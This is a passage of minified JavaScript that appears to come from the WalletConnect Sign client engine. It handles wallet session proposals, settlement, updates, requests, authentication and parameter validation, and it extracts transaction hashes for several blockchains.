                    const {topic: t, payload: r, attestation: n, encryptedId: o} = e
                      , {params: i, id: s} = r;
                    try {
                        const e = this.client.core.eventClient.getEvent({
                            topic: t
                        });
                        0 === this.client.events.listenerCount("session_proposal") && (console.warn("No listener for session_proposal event"),
                        null !== e && void 0 !== e && e.setError(Xm)),
                        this.isValidConnect(gA({}, r.params));
                        const a = i.expiryTimestamp || hu(eA.wc_sessionPropose.req.ttl)
                          , c = gA({
                            id: s,
                            pairingTopic: t,
                            expiryTimestamp: a
                        }, i);
                        await this.setProposal(s, c);
                        const l = await this.getVerifyContext({
                            attestationId: n,
                            hash: og(JSON.stringify(r)),
                            encryptedId: o,
                            metadata: c.proposer.metadata
                        });
                        null !== e && void 0 !== e && e.addTrace(Gm),
                        this.client.events.emit("session_proposal", {
                            id: s,
                            params: c,
                            verifyContext: l
                        })
                    } catch (at) {
                        await this.sendError({
                            id: s,
                            topic: t,
                            error: at,
                            rpcOpts: eA.wc_sessionPropose.autoReject
                        }),
                        this.client.logger.error(at)
                    }
                }
                )),
                mA(this, "onSessionProposeResponse", (async (e, t, r) => {
                    const {id: n} = t;
                    if (Ly(t)) {
                        const {result: o} = t;
                        this.client.logger.trace({
                            type: "method",
                            method: "onSessionProposeResponse",
                            result: o
                        });
                        const i = this.client.proposal.get(n);
                        this.client.logger.trace({
                            type: "method",
                            method: "onSessionProposeResponse",
                            proposal: i
                        });
                        const s = i.proposer.publicKey;
                        this.client.logger.trace({
                            type: "method",
                            method: "onSessionProposeResponse",
                            selfPublicKey: s
                        });
                        const a = o.responderPublicKey;
                        this.client.logger.trace({
                            type: "method",
                            method: "onSessionProposeResponse",
                            peerPublicKey: a
                        });
                        const c = await this.client.core.crypto.generateSharedKey(s, a);
                        this.pendingSessions.set(n, {
                            sessionTopic: c,
                            pairingTopic: e,
                            proposalId: n,
                            publicKey: s
                        });
                        const l = await this.client.core.relayer.subscribe(c, {
                            transportType: r
                        });
                        this.client.logger.trace({
                            type: "method",
                            method: "onSessionProposeResponse",
                            subscriptionId: l
                        }),
                        await this.client.core.pairing.activate({
                            topic: e
                        })
                    } else if (jy(t)) {
                        await this.client.proposal.delete(n, Dg("USER_DISCONNECTED"));
                        const e = pu("session_connect", n);
                        if (0 === this.events.listenerCount(e))
                            throw new Error("emitting ".concat(e, " without any listeners, 954"));
                        this.events.emit(e, {
                            error: t.error
                        })
                    }
                }
                )),
                mA(this, "onSessionSettleRequest", (async (e, t) => {
                    const {id: r, params: n} = t;
                    try {
                        this.isValidSessionSettleRequest(n);
                        const {relay: r, controller: o, expiry: i, namespaces: s, sessionProperties: a, scopedProperties: c, sessionConfig: l} = t.params
                          , u = [...this.pendingSessions.values()].find((t => t.sessionTopic === e));
                        if (!u)
                            return this.client.logger.error("Pending session not found for topic ".concat(e));
                        const d = this.client.proposal.get(u.proposalId)
                          , h = yA(gA(gA(gA({
                            topic: e,
                            relay: r,
                            expiry: i,
                            namespaces: s,
                            acknowledged: !0,
                            pairingTopic: u.pairingTopic,
                            requiredNamespaces: d.requiredNamespaces,
                            optionalNamespaces: d.optionalNamespaces,
                            controller: o.publicKey,
                            self: {
                                publicKey: u.publicKey,
                                metadata: this.client.metadata
                            },
                            peer: {
                                publicKey: o.publicKey,
                                metadata: o.metadata
                            }
                        }, a && {
                            sessionProperties: a
                        }), c && {
                            scopedProperties: c
                        }), l && {
                            sessionConfig: l
                        }), {
                            transportType: hm.relay
                        });
                        await this.client.session.set(h.topic, h),
                        await this.setExpiry(h.topic, h.expiry),
                        await this.client.core.pairing.updateMetadata({
                            topic: u.pairingTopic,
                            metadata: h.peer.metadata
                        }),
                        this.client.events.emit("session_connect", {
                            session: h
                        }),
                        this.events.emit(pu("session_connect", u.proposalId), {
                            session: h
                        }),
                        this.pendingSessions.delete(u.proposalId),
                        this.deleteProposal(u.proposalId, !1),
                        this.cleanupDuplicatePairings(h),
                        await this.sendResult({
                            id: t.id,
                            topic: e,
                            result: !0,
                            throwOnFailedPublish: !0
                        })
                    } catch (M) {
                        await this.sendError({
                            id: r,
                            topic: e,
                            error: M
                        }),
                        this.client.logger.error(M)
                    }
                }
                )),
                mA(this, "onSessionSettleResponse", (async (e, t) => {
                    const {id: r} = t;
                    Ly(t) ? (await this.client.session.update(e, {
                        acknowledged: !0
                    }),
                    this.events.emit(pu("session_approve", r), {})) : jy(t) && (await this.client.session.delete(e, Dg("USER_DISCONNECTED")),
                    this.events.emit(pu("session_approve", r), {
                        error: t.error
                    }))
                }
                )),
                mA(this, "onSessionUpdateRequest", (async (e, t) => {
                    const {params: r, id: n} = t;
                    try {
                        const t = "".concat(e, "_session_update")
                          , o = ay.get(t);
                        if (o && this.isRequestOutOfSync(o, n))
                            return this.client.logger.warn("Discarding out of sync request - ".concat(n)),
                            void this.sendError({
                                id: n,
                                topic: e,
                                error: Dg("INVALID_UPDATE_REQUEST")
                            });
                        this.isValidUpdate(gA({
                            topic: e
                        }, r));
                        try {
                            ay.set(t, n),
                            await this.client.session.update(e, {
                                namespaces: r.namespaces
                            }),
                            await this.sendResult({
                                id: n,
                                topic: e,
                                result: !0,
                                throwOnFailedPublish: !0
                            })
                        } catch (Nt) {
                            throw ay.delete(t),
                            Nt
                        }
                        this.client.events.emit("session_update", {
                            id: n,
                            topic: e,
                            params: r
                        })
                    } catch (M) {
                        await this.sendError({
                            id: n,
                            topic: e,
                            error: M
                        }),
                        this.client.logger.error(M)
                    }
                }
                )),
                mA(this, "isRequestOutOfSync", ( (e, t) => t.toString().slice(0, -3) < e.toString().slice(0, -3))),
                mA(this, "onSessionUpdateResponse", ( (e, t) => {
                    const {id: r} = t
                      , n = pu("session_update", r);
                    if (0 === this.events.listenerCount(n))
                        throw new Error("emitting ".concat(n, " without any listeners"));
                    Ly(t) ? this.events.emit(pu("session_update", r), {}) : jy(t) && this.events.emit(pu("session_update", r), {
                        error: t.error
                    })
                }
                )),
                mA(this, "onSessionExtendRequest", (async (e, t) => {
                    const {id: r} = t;
                    try {
                        this.isValidExtend({
                            topic: e
                        }),
                        await this.setExpiry(e, hu(QT)),
                        await this.sendResult({
                            id: r,
                            topic: e,
                            result: !0,
                            throwOnFailedPublish: !0
                        }),
                        this.client.events.emit("session_extend", {
                            id: r,
                            topic: e
                        })
                    } catch (Ot) {
                        await this.sendError({
                            id: r,
                            topic: e,
                            error: Ot
                        }),
                        this.client.logger.error(Ot)
                    }
                }
                )),
                mA(this, "onSessionExtendResponse", ( (e, t) => {
                    const {id: r} = t
                      , n = pu("session_extend", r);
                    if (0 === this.events.listenerCount(n))
                        throw new Error("emitting ".concat(n, " without any listeners"));
                    Ly(t) ? this.events.emit(pu("session_extend", r), {}) : jy(t) && this.events.emit(pu("session_extend", r), {
                        error: t.error
                    })
                }
                )),
                mA(this, "onSessionPingRequest", (async (e, t) => {
                    const {id: r} = t;
                    try {
                        this.isValidPing({
                            topic: e
                        }),
                        await this.sendResult({
                            id: r,
                            topic: e,
                            result: !0,
                            throwOnFailedPublish: !0
                        }),
                        this.client.events.emit("session_ping", {
                            id: r,
                            topic: e
                        })
                    } catch (Ot) {
                        await this.sendError({
                            id: r,
                            topic: e,
                            error: Ot
                        }),
                        this.client.logger.error(Ot)
                    }
                }
                )),
                mA(this, "onSessionPingResponse", ( (e, t) => {
                    const {id: r} = t
                      , n = pu("session_ping", r);
                    setTimeout(( () => {
                        if (0 === this.events.listenerCount(n))
                            throw new Error("emitting ".concat(n, " without any listeners 2176"));
                        Ly(t) ? this.events.emit(pu("session_ping", r), {}) : jy(t) && this.events.emit(pu("session_ping", r), {
                            error: t.error
                        })
                    }
                    ), 500)
                }
                )),
                mA(this, "onSessionDeleteRequest", (async (e, t) => {
                    const {id: r} = t;
                    try {
                        this.isValidDisconnect({
                            topic: e,
                            reason: t.params
                        }),
                        Promise.all([new Promise((t => {
                            this.client.core.relayer.once(sm, (async () => {
                                t(await this.deleteSession({
                                    topic: e,
                                    id: r
                                }))
                            }
                            ))
                        }
                        )), this.sendResult({
                            id: r,
                            topic: e,
                            result: !0,
                            throwOnFailedPublish: !0
                        }), this.cleanupPendingSentRequestsForTopic({
                            topic: e,
                            error: Dg("USER_DISCONNECTED")
                        })]).catch((e => this.client.logger.error(e)))
                    } catch (Ot) {
                        this.client.logger.error(Ot)
                    }
                }
                )),
                mA(this, "onSessionRequest", (async e => {
                    var t, r, n;
                    const {topic: o, payload: i, attestation: s, encryptedId: a, transportType: c} = e
                      , {id: l, params: u} = i;
                    try {
                        await this.isValidRequest(gA({
                            topic: o
                        }, u));
                        const e = this.client.session.get(o)
                          , i = {
                            id: l,
                            topic: o,
                            params: u,
                            verifyContext: await this.getVerifyContext({
                                attestationId: s,
                                hash: og(JSON.stringify(Iy("wc_sessionRequest", u, l))),
                                encryptedId: a,
                                metadata: e.peer.metadata,
                                transportType: c
                            })
                        };
                        await this.setPendingSessionRequest(i),
                        c === hm.link_mode && null != (t = e.peer.metadata.redirect) && t.universal && this.client.core.addLinkModeSupportedApp(null == (r = e.peer.metadata.redirect) ? void 0 : r.universal),
                        null != (n = this.client.signConfig) && n.disableRequestQueue ? this.emitSessionRequest(i) : (this.addSessionRequestToSessionRequestQueue(i),
                        this.processSessionRequestQueue())
                    } catch (vt) {
                        await this.sendError({
                            id: l,
                            topic: o,
                            error: vt
                        }),
                        this.client.logger.error(vt)
                    }
                }
                )),
                mA(this, "onSessionRequestResponse", ( (e, t) => {
                    const {id: r} = t
                      , n = pu("session_request", r);
                    if (0 === this.events.listenerCount(n))
                        throw new Error("emitting ".concat(n, " without any listeners"));
                    Ly(t) ? this.events.emit(pu("session_request", r), {
                        result: t.result
                    }) : jy(t) && this.events.emit(pu("session_request", r), {
                        error: t.error
                    })
                }
                )),
                mA(this, "onSessionEventRequest", (async (e, t) => {
                    const {id: r, params: n} = t;
                    try {
                        const t = "".concat(e, "_session_event_").concat(n.event.name)
                          , o = ay.get(t);
                        if (o && this.isRequestOutOfSync(o, r))
                            return void this.client.logger.info("Discarding out of sync request - ".concat(r));
                        this.isValidEmit(gA({
                            topic: e
                        }, n)),
                        this.client.events.emit("session_event", {
                            id: r,
                            topic: e,
                            params: n
                        }),
                        ay.set(t, r)
                    } catch (M) {
                        await this.sendError({
                            id: r,
                            topic: e,
                            error: M
                        }),
                        this.client.logger.error(M)
                    }
                }
                )),
                mA(this, "onSessionAuthenticateResponse", ( (e, t) => {
                    const {id: r} = t;
                    this.client.logger.trace({
                        type: "method",
                        method: "onSessionAuthenticateResponse",
                        topic: e,
                        payload: t
                    }),
                    Ly(t) ? this.events.emit(pu("session_request", r), {
                        result: t.result
                    }) : jy(t) && this.events.emit(pu("session_request", r), {
                        error: t.error
                    })
                }
                )),
                mA(this, "onSessionAuthenticateRequest", (async e => {
                    var t;
                    const {topic: r, payload: n, attestation: o, encryptedId: i, transportType: s} = e;
                    try {
                        const {requester: e, authPayload: a, expiryTimestamp: c} = n.params
                          , l = await this.getVerifyContext({
                            attestationId: o,
                            hash: og(JSON.stringify(n)),
                            encryptedId: i,
                            metadata: e.metadata,
                            transportType: s
                        })
                          , u = {
                            requester: e,
                            pairingTopic: r,
                            id: n.id,
                            authPayload: a,
                            verifyContext: l,
                            expiryTimestamp: c
                        };
                        await this.setAuthRequest(n.id, {
                            request: u,
                            pairingTopic: r,
                            transportType: s
                        }),
                        s === hm.link_mode && null != (t = e.metadata.redirect) && t.universal && this.client.core.addLinkModeSupportedApp(e.metadata.redirect.universal),
                        this.client.events.emit("session_authenticate", {
                            topic: r,
                            params: n.params,
                            id: n.id,
                            verifyContext: l
                        })
                    } catch (at) {
                        this.client.logger.error(at);
                        const t = n.params.requester.publicKey
                          , o = await this.client.core.crypto.generateKeyPair()
                          , i = this.getAppLinkIfEnabled(n.params.requester.metadata, s)
                          , a = {
                            type: 1,
                            receiverPublicKey: t,
                            senderPublicKey: o
                        };
                        await this.sendError({
                            id: n.id,
                            topic: r,
                            error: at,
                            encodeOpts: a,
                            rpcOpts: eA.wc_sessionAuthenticate.autoReject,
                            appLink: i
                        })
                    }
                }
                )),
                mA(this, "addSessionRequestToSessionRequestQueue", (e => {
                    this.sessionRequestQueue.queue.push(e)
                }
                )),
                mA(this, "cleanupAfterResponse", (e => {
                    this.deletePendingSessionRequest(e.response.id, {
                        message: "fulfilled",
                        code: 0
                    }),
                    setTimeout(( () => {
                        this.sessionRequestQueue.state = rA,
                        this.processSessionRequestQueue()
                    }
                    ), (0,
                    Be.toMiliseconds)(this.requestQueueDelay))
                }
                )),
                mA(this, "cleanupPendingSentRequestsForTopic", (e => {
                    let {topic: t, error: r} = e;
                    const n = this.client.core.history.pending;
                    n.length > 0 && n.filter((e => e.topic === t && "wc_sessionRequest" === e.request.method)).forEach((e => {
                        const t = pu("session_request", e.request.id);
                        if (0 === this.events.listenerCount(t))
                            throw new Error("emitting ".concat(t, " without any listeners"));
                        this.events.emit(pu("session_request", e.request.id), {
                            error: r
                        })
                    }
                    ))
                }
                )),
                mA(this, "processSessionRequestQueue", ( () => {
                    if (this.sessionRequestQueue.state === nA)
                        return void this.client.logger.info("session request queue is already active.");
                    const e = this.sessionRequestQueue.queue[0];
                    if (e)
                        try {
                            this.sessionRequestQueue.state = nA,
                            this.emitSessionRequest(e)
                        } catch (_l) {
                            this.client.logger.error(_l)
                        }
                    else
                        this.client.logger.info("session request queue is empty.")
                }
                )),
                mA(this, "emitSessionRequest", (e => {
                    this.client.events.emit("session_request", e)
                }
                )),
                mA(this, "onPairingCreated", (e => {
                    if (e.methods && this.expectedPairingMethodMap.set(e.topic, e.methods),
                    e.active)
                        return;
                    const t = this.client.proposal.getAll().find((t => t.pairingTopic === e.topic));
                    t && this.onSessionProposeRequest({
                        topic: e.topic,
                        payload: Iy("wc_sessionPropose", yA(gA({}, t), {
                            requiredNamespaces: t.requiredNamespaces,
                            optionalNamespaces: t.optionalNamespaces,
                            relays: t.relays,
                            proposer: t.proposer,
                            sessionProperties: t.sessionProperties,
                            scopedProperties: t.scopedProperties
                        }), t.id)
                    })
                }
                )),
                mA(this, "isValidConnect", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "connect() params: ".concat(JSON.stringify(e)));
                        throw new Error(t)
                    }
                    const {pairingTopic: t, requiredNamespaces: r, optionalNamespaces: n, sessionProperties: o, scopedProperties: i, relays: s} = e;
                    if (zg(t) || await this.isValidPairingTopic(t),
                    !function(e, t) {
                        let r = !1;
                        return t && !e ? r = !0 : e && Lg(e) && e.length && e.forEach((e => {
                            r = Jg(e)
                        }
                        )),
                        r
                    }(s, !0)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "connect() relays: ".concat(s));
                        throw new Error(e)
                    }
                    if (!zg(r) && 0 !== jg(r)) {
                        const e = "requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";
                        ["fatal", "error", "silent"].includes(this.client.logger.level) ? console.warn(e) : this.client.logger.warn(e),
                        this.validateNamespaces(r, "requiredNamespaces")
                    }
                    if (!zg(n) && 0 !== jg(n) && this.validateNamespaces(n, "optionalNamespaces"),
                    zg(o) || this.validateSessionProps(o, "sessionProperties"),
                    !zg(i)) {
                        this.validateSessionProps(i, "scopedProperties");
                        const e = Object.keys(r || {}).concat(Object.keys(n || {}));
                        if (!Object.keys(i).every((t => e.includes(t))))
                            throw new Error("Scoped properties must be a subset of required/optional namespaces, received: ".concat(JSON.stringify(i), ", required/optional namespaces: ").concat(JSON.stringify(e)))
                    }
                }
                )),
                mA(this, "validateNamespaces", ( (e, t) => {
                    const r = function(e, t, r) {
                        let n = null;
                        if (e && jg(e)) {
                            const o = Zg(e, t);
                            o && (n = o);
                            const i = $g(e, t, r);
                            i && (n = i)
                        } else
                            n = Ug("MISSING_OR_INVALID", "".concat(t, ", ").concat(r, " should be an object with data"));
                        return n
                    }(e, "connect()", t);
                    if (r)
                        throw new Error(r.message)
                }
                )),
                mA(this, "isValidApprove", (async e => {
                    if (!Xg(e))
                        throw new Error(Ug("MISSING_OR_INVALID", "approve() params: ".concat(e)).message);
                    const {id: t, namespaces: r, relayProtocol: n, sessionProperties: o, scopedProperties: i} = e;
                    this.checkRecentlyDeleted(t),
                    await this.isValidProposalId(t);
                    const s = this.client.proposal.get(t)
                      , a = Yg(r, "approve()");
                    if (a)
                        throw new Error(a.message);
                    const c = ry(s.requiredNamespaces, r, "approve()");
                    if (c)
                        throw new Error(c.message);
                    if (!Vg(n, !0)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "approve() relayProtocol: ".concat(n));
                        throw new Error(e)
                    }
                    if (zg(o) || this.validateSessionProps(o, "sessionProperties"),
                    !zg(i)) {
                        this.validateSessionProps(i, "scopedProperties");
                        const e = new Set(Object.keys(r));
                        if (!Object.keys(i).every((t => e.has(t))))
                            throw new Error("Scoped properties must be a subset of approved namespaces, received: ".concat(JSON.stringify(i), ", approved namespaces: ").concat(Array.from(e).join(", ")))
                    }
                }
                )),
                mA(this, "isValidReject", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "reject() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {id: t, reason: r} = e;
                    if (this.checkRecentlyDeleted(t),
                    await this.isValidProposalId(t),
                    !function(e) {
                        return !(!e || "object" != typeof e || !e.code || !Hg(e.code, !1) || !e.message || !Vg(e.message, !1))
                    }(r)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "reject() reason: ".concat(JSON.stringify(r)));
                        throw new Error(e)
                    }
                }
                )),
                mA(this, "isValidSessionSettleRequest", (e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "onSessionSettleRequest() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {relay: t, controller: r, namespaces: n, expiry: o} = e;
                    if (!Jg(t)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "onSessionSettleRequest() relay protocol should be a string");
                        throw new Error(e)
                    }
                    const i = function(e, t) {
                        let r = null;
                        return Vg(null === e || void 0 === e ? void 0 : e.publicKey, !1) || (r = Ug("MISSING_OR_INVALID", "".concat(t, " controller public key should be a string"))),
                        r
                    }(r, "onSessionSettleRequest()");
                    if (i)
                        throw new Error(i.message);
                    const s = Yg(n, "onSessionSettleRequest()");
                    if (s)
                        throw new Error(s.message);
                    if (fu(o)) {
                        const {message: e} = Ug("EXPIRED", "onSessionSettleRequest()");
                        throw new Error(e)
                    }
                }
                )),
                mA(this, "isValidUpdate", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "update() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t, namespaces: r} = e;
                    this.checkRecentlyDeleted(t),
                    await this.isValidSessionTopic(t);
                    const n = this.client.session.get(t)
                      , o = Yg(r, "update()");
                    if (o)
                        throw new Error(o.message);
                    const i = ry(n.requiredNamespaces, r, "update()");
                    if (i)
                        throw new Error(i.message)
                }
                )),
                mA(this, "isValidExtend", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "extend() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t} = e;
                    this.checkRecentlyDeleted(t),
                    await this.isValidSessionTopic(t)
                }
                )),
                mA(this, "isValidRequest", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "request() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t, request: r, chainId: n, expiry: o} = e;
                    this.checkRecentlyDeleted(t),
                    await this.isValidSessionTopic(t);
                    const {namespaces: i} = this.client.session.get(t);
                    if (!Qg(i, n)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "request() chainId: ".concat(n));
                        throw new Error(e)
                    }
                    if (!function(e) {
                        return !(zg(e) || !Vg(e.method, !1))
                    }(r)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "request() ".concat(JSON.stringify(r)));
                        throw new Error(e)
                    }
                    if (!ey(i, n, r.method)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "request() method: ".concat(r.method));
                        throw new Error(e)
                    }
                    if (o && !function(e, t) {
                        return Hg(e, !1) && e <= t.max && e >= t.min
                    }(o, tA)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "request() expiry: ".concat(o, ". Expiry must be a number (in seconds) between ").concat(tA.min, " and ").concat(tA.max));
                        throw new Error(e)
                    }
                }
                )),
                mA(this, "isValidRespond", (async e => {
                    var t;
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "respond() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: r, response: n} = e;
                    try {
                        await this.isValidSessionTopic(r)
                    } catch (M) {
                        throw null != (t = null === e || void 0 === e ? void 0 : e.response) && t.id && this.cleanupAfterResponse(e),
                        M
                    }
                    if (!function(e) {
                        return !(zg(e) || zg(e.result) && zg(e.error) || !Hg(e.id, !1) || !Vg(e.jsonrpc, !1))
                    }(n)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "respond() response: ".concat(JSON.stringify(n)));
                        throw new Error(e)
                    }
                }
                )),
                mA(this, "isValidPing", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "ping() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t} = e;
                    await this.isValidSessionOrPairingTopic(t)
                }
                )),
                mA(this, "isValidEmit", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "emit() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t, event: r, chainId: n} = e;
                    await this.isValidSessionTopic(t);
                    const {namespaces: o} = this.client.session.get(t);
                    if (!Qg(o, n)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "emit() chainId: ".concat(n));
                        throw new Error(e)
                    }
                    if (!function(e) {
                        return !(zg(e) || !Vg(e.name, !1))
                    }(r)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "emit() event: ".concat(JSON.stringify(r)));
                        throw new Error(e)
                    }
                    if (!ty(o, n, r.name)) {
                        const {message: e} = Ug("MISSING_OR_INVALID", "emit() event: ".concat(JSON.stringify(r)));
                        throw new Error(e)
                    }
                }
                )),
                mA(this, "isValidDisconnect", (async e => {
                    if (!Xg(e)) {
                        const {message: t} = Ug("MISSING_OR_INVALID", "disconnect() params: ".concat(e));
                        throw new Error(t)
                    }
                    const {topic: t} = e;
                    await this.isValidSessionOrPairingTopic(t)
                }
                )),
                mA(this, "isValidAuthenticate", (e => {
                    const {chains: t, uri: r, domain: n, nonce: o} = e;
                    if (!Array.isArray(t) || 0 === t.length)
                        throw new Error("chains is required and must be a non-empty array");
                    if (!Vg(r, !1))
                        throw new Error("uri is required parameter");
                    if (!Vg(n, !1))
                        throw new Error("domain is required parameter");
                    if (!Vg(o, !1))
                        throw new Error("nonce is required parameter");
                    if ([...new Set(t.map((e => Ml(e).namespace)))].length > 1)
                        throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");
                    const {namespace: i} = Ml(t[0]);
                    if ("eip155" !== i)
                        throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")
                }
                )),
                mA(this, "getVerifyContext", (async e => {
                    const {attestationId: t, hash: r, encryptedId: n, metadata: o, transportType: i} = e
                      , s = {
                        verified: {
                            verifyUrl: o.verifyUrl || km,
                            validation: "UNKNOWN",
                            origin: o.url || ""
                        }
                    };
                    try {
                        if (i === hm.link_mode) {
                            const e = this.getAppLinkIfEnabled(o, i);
                            return s.verified.validation = e && new URL(e).origin === new URL(o.url).origin ? "VALID" : "INVALID",
                            s
                        }
                        const e = await this.client.core.verify.resolve({
                            attestationId: t,
                            hash: r,
                            encryptedId: n,
                            verifyUrl: o.verifyUrl
                        });
                        e && (s.verified.origin = e.origin,
                        s.verified.isScam = e.isScam,
                        s.verified.validation = e.origin === new URL(o.url).origin ? "VALID" : "INVALID")
                    } catch (at) {
                        this.client.logger.warn(at)
                    }
                    return this.client.logger.debug("Verify context: ".concat(JSON.stringify(s))),
                    s
                }
                )),
                mA(this, "validateSessionProps", ( (e, t) => {
                    Object.values(e).forEach(( (r, n) => {
                        if (null == r) {
                            const {message: o} = Ug("MISSING_OR_INVALID", "".concat(t, " must contain an existing value for each key. Received: ").concat(r, " for key ").concat(Object.keys(e)[n]));
                            throw new Error(o)
                        }
                    }
                    ))
                }
                )),
                mA(this, "getPendingAuthRequest", (e => {
                    const t = this.client.auth.requests.get(e);
                    return "object" == typeof t ? t : void 0
                }
                )),
                mA(this, "addToRecentlyDeleted", ( (e, t) => {
                    if (this.recentlyDeletedMap.set(e, t),
                    this.recentlyDeletedMap.size >= this.recentlyDeletedLimit) {
                        let e = 0;
                        const t = this.recentlyDeletedLimit / 2;
                        for (const r of this.recentlyDeletedMap.keys()) {
                            if (e++ >= t)
                                break;
                            this.recentlyDeletedMap.delete(r)
                        }
                    }
                }
                )),
                mA(this, "checkRecentlyDeleted", (e => {
                    const t = this.recentlyDeletedMap.get(e);
                    if (t) {
                        const {message: r} = Ug("MISSING_OR_INVALID", "Record was recently deleted - ".concat(t, ": ").concat(e));
                        throw new Error(r)
                    }
                }
                )),
                mA(this, "isLinkModeEnabled", ( (e, t) => {
                    var n, o, i, s, a, c, l, u, d;
                    return !(!e || t !== hm.link_mode) && (!0 === (null == (o = null == (n = this.client.metadata) ? void 0 : n.redirect) ? void 0 : o.linkMode) && void 0 !== (null == (s = null == (i = this.client.metadata) ? void 0 : i.redirect) ? void 0 : s.universal) && "" !== (null == (c = null == (a = this.client.metadata) ? void 0 : a.redirect) ? void 0 : c.universal) && void 0 !== (null == (l = null === e || void 0 === e ? void 0 : e.redirect) ? void 0 : l.universal) && "" !== (null == (u = null === e || void 0 === e ? void 0 : e.redirect) ? void 0 : u.universal) && !0 === (null == (d = null === e || void 0 === e ? void 0 : e.redirect) ? void 0 : d.linkMode) && this.client.core.linkModeSupportedApps.includes(e.redirect.universal) && typeof (null == r.g ? void 0 : r.g.Linking) < "u")
                }
                )),
                mA(this, "getAppLinkIfEnabled", ( (e, t) => {
                    var r;
                    return this.isLinkModeEnabled(e, t) ? null == (r = null === e || void 0 === e ? void 0 : e.redirect) ? void 0 : r.universal : void 0
                }
                )),
                mA(this, "handleLinkModeMessage", (e => {
                    let {url: t} = e;
                    if (!t || !t.includes("wc_ev") || !t.includes("topic"))
                        return;
                    const r = mu(t, "topic") || ""
                      , n = decodeURIComponent(mu(t, "wc_ev") || "")
                      , o = this.client.session.keys.includes(r);
                    o && this.client.session.update(r, {
                        transportType: hm.link_mode
                    }),
                    this.client.core.dispatchEnvelope({
                        topic: r,
                        message: n,
                        sessionExists: o
                    })
                }
                )),
                mA(this, "registerLinkModeListeners", (async () => {
                    var e;
                    if (vu() || Jl() && null != (e = this.client.metadata.redirect) && e.linkMode) {
                        const e = null == r.g ? void 0 : r.g.Linking;
                        if (typeof e < "u") {
                            e.addEventListener("url", this.handleLinkModeMessage, this.client.name);
                            const t = await e.getInitialURL();
                            t && setTimeout(( () => {
                                this.handleLinkModeMessage({
                                    url: t
                                })
                            }
                            ), 50)
                        }
                    }
                }
                )),
                mA(this, "getTVFParams", ( (e, t, r) => {
                    var n, o;
                    const i = {
                        correlationId: e,
                        rpcMethods: [t.request.method],
                        chainId: t.chainId
                    };
                    try {
                        const e = this.extractTxHashesFromResult(t.request, r);
                        i.txHashes = e,
                        i.contractAddresses = this.isValidContractData(t.request.params) ? [null == (o = null == (n = t.request.params) ? void 0 : n[0]) ? void 0 : o.to] : []
                    } catch (Nt) {
                        this.client.logger.warn("Error getting TVF params", Nt)
                    }
                    return i
                }
                )),
                mA(this, "isValidContractData", (e => {
                    var t;
                    if (!e)
                        return !1;
                    try {
                        const r = (null === e || void 0 === e ? void 0 : e.data) || (null == (t = null === e || void 0 === e ? void 0 : e[0]) ? void 0 : t.data);
                        if (!r.startsWith("0x"))
                            return !1;
                        const n = r.slice(2);
                        return !!/^[0-9a-fA-F]*$/.test(n) && n.length % 2 === 0
                    } catch (r) {}
                    return !1
                }
                )),
                mA(this, "extractTxHashesFromResult", ( (e, t) => {
                    var r;
                    try {
                        if (!t)
                            return [];
                        const n = e.method
                          , o = oA[n];
                        if ("sui_signTransaction" === n)
                            return [eh(t.transactionBytes)];
                        if ("near_signTransaction" === n)
                            return [th(t)];
                        if ("near_signTransactions" === n)
                            return t.map((e => th(e)));
                        if ("xrpl_signTransactionFor" === n || "xrpl_signTransaction" === n)
                            return [null == (r = t.tx_json) ? void 0 : r.hash];
                        if ("polkadot_signTransaction" === n)
                            return [uy({
                                transaction: e.params.transactionPayload,
                                signature: t.signature
                            })];
                        if ("algo_signTxn" === n)
                            return Lg(t) ? t.map((e => rh(e))) : [rh(t)];
                        if ("cosmos_signDirect" === n)
                            return [oh(t)];
                        if ("string" == typeof t)
                            return [t];
                        const i = t[o.key];
                        if (Lg(i))
                            return "solana_signAllTransactions" === n ? i.map((e => function(e) {
                                const t = atob(e)
                                  , r = new Uint8Array(t.length);
                                for (let s = 0; s < t.length; s++)
                                    r[s] = t.charCodeAt(s);
                                const n = r[0];
                                if (0 === n)
                                    throw new Error("No signatures found");
                                const o = 1 + 64 * n;
                                if (r.length < o)
                                    throw new Error("Transaction data too short for claimed signature count");
                                if (r.length < 100)
                                    throw new Error("Transaction too short");
                                const i = Buffer.from(e, "base64").slice(1, 65);
                                return zs.encode(i)
                            }(e))) : i;
                        if ("string" == typeof i)
                            return [i]
                    } catch (Ot) {
                        this.client.logger.warn("Error extracting tx hashes from result", Ot)
                    }
                    return []
                }
                ))
            }
            async processPendingMessageEvents() {
                try {
                    const t = this.client.session.keys
                      , r = this.client.core.relayer.messages.getWithoutAck(t);
                    for (const [n,o] of Object.entries(r))
